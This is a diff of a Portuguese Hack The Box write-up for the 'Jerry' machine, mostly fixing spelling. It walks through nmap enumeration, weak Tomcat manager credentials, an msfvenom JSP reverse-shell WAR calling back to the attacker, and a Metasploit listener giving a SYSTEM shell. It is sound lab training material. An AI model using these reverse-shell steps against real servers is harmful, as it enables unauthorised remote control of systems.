@@ -1,9 +1,9 @@
 # Hack The Box - Máquina: Jerry
 
-![Alt text](jerry.png)
+![Alt text](Jerry.png)
 
 ## Resumo
-Embora a máquina Jerry seja uma das mais simples no Hack The Box, ela apresenta uma situação realista, já que o Apache Tomcat frequentemente é encontrado exposto e configurado com credenciais comuns ou fracas. Isso proporciona uma oportunidade de exploração e acesso, tornando a máquina Jerry um ambiente educativo para compreender tais cenários.
+Embora a máquina Jerry seja uma das mais simples no Hack The Box, ela apresenta uma situação realista, já que o Apache Tomcat é frequentemente encontrado exposto e configurado com credenciais comuns ou fracas. Isso proporciona uma oportunidade de exploração e acesso, tornando a máquina Jerry um ambiente educativo para compreender tais cenários.
 
 ## Enumeração
 
@@ -13,7 +13,7 @@ Primeiramente devemos utilizar a ferramenta Nmap para verificar as portas aberta
 
 <code>nmap -A {IP da maquina}</code>
 
-O comando acima é um dos mais basicos do nmap, utilizamos as seguintes opções?
+O comando acima é um dos mais básicos do nmap, utilizamos as seguintes opções?
 
 * **-A** é uma opção que ativa um conjunto abrangente de técnicas de varredura agressiva. Essas técnicas incluem detecção de versão, verificação de scripts, detecção de sistema operacional e rastreamento de rota.
 
@@ -53,7 +53,7 @@ Com este retorno conseguimos as seguintes informações
 
 ![Alt text](manager_app.png)
 
-Com acesso ao gerenciamento da aplicação, podemos passar para a proxima fase.
+Com acesso ao gerenciamento da aplicação, podemos passar para a próxima fase.
 
 ## Exploitation
 
@@ -66,7 +66,7 @@ O Tomcat Manager facilita a implantação de arquivos WAR com apenas alguns cliq
 
 ### Criando o Arquivo com o payload.
 
-Como informado acima, iremos utilizar um arquivo WAR para conseguirmos acesso ao servidor, existem varias maneiras de criar o arquivo, porem neste caso vamos utiliar a ferramenta **msfvenom** para este proposito, e vamos receber a conexão utilizando o **Metasploit**.
+Como informado acima, iremos utilizar um arquivo WAR para conseguirmos acesso ao servidor, existem várias maneiras de criar o arquivo, porem neste caso vamos utilizar a ferramenta **msfvenom** para este proposito, e vamos receber a conexão utilizando o **Metasploit**.
 
 Para criar o arquivo utilizaremos o seguinte comando:
 <pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP de sua maquina} LPORT=1337 -f war > shell_tcp_1337.war</pre></code>
@@ -76,12 +76,12 @@ Agora vamos entender melhor o comando acima
 * <code>-p windows/shell_reverse_tcp</code> Esta parte do comando define o tipo de payload que você deseja gerar. Nesse caso, é um payload de shell reverso para sistemas Windows.
 * <code>LHOST={IP de sua máquina}</code> Aqui, você precisa substituir {IP de sua máquina} pelo endereço IP da sua máquina. Isso indica para onde o payload reverso enviará a conexão.
 * <code>LPORT=1337</code> Isso define a porta de escuta na qual seu payload reverso estará ouvindo por uma conexão. Neste exemplo, a porta é definida como 1337, mas você pode ajustá-la conforme necessário.
-* <code>-f war</code> Esta opção especifica o formato de saída que você deseja para a carga útil. No caso, você está escolhendo o formato "war",
+* <code>-f war</code> Esta opção específica o formato de saída que você deseja para a carga útil. No caso, você está escolhendo o formato "war",
 * <code>> shell_tcp_1337.war</code> O operador '>' é usado para redirecionar a saída do comando para um arquivo. Aqui, você está redirecionando o retorno gerado para um arquivo chamado "shell_tcp_1337.war".
 
 ### Upload e recebendo o shell
 
-Agora que temos o arquivo de com o payload, precisamo apenas realizar o upload utilizando o campo de 'WAR file to deploy'
+Agora que temos o arquivo com o payload, precisamo apenas realizar o upload utilizando o campo de 'WAR file to deploy'
 
 ![Alt text](upload.png)
 ![Alt text](upload2.png)
@@ -92,15 +92,15 @@ Para isso digitamos o seguinte comando
 
 <pre><code>msfconsole -q -x "use multi/handler;set LHOST 10.10.14.128; set LPORT 1337; run"</pre></code>
 
-Então apos a execução do comando, podemos carregar a pagina com nosso payload, e vamos receber uma conexão reversa como system.
+Então, após a execução do comando, podemos carregar a página com nosso payload, e vamos receber uma conexão reversa como system.
 
 ![Alt text](whoami.png)
 
 ## Post Exploitation
 
-Neste caso como recebemos o shell com privilegios altos, não sera necessario realizar uma elevação de privilegios, basta buscar pelas flags.
+Neste caso, como recebemos o shell com privilégios altos, não será necessário realizar uma elevação de privilégios, basta buscar pelas flags.
 
-Conseguimos encontrar as duas flags em um unico arquivo, no caminho:
+Conseguimos encontrar as duas flags em um único arquivo, no caminho:
 <pre><code>C:\Users\Administrator\Desktop\flags</code></pre>
 
 Dentro do arquivo "2 for the price of 1.txt"
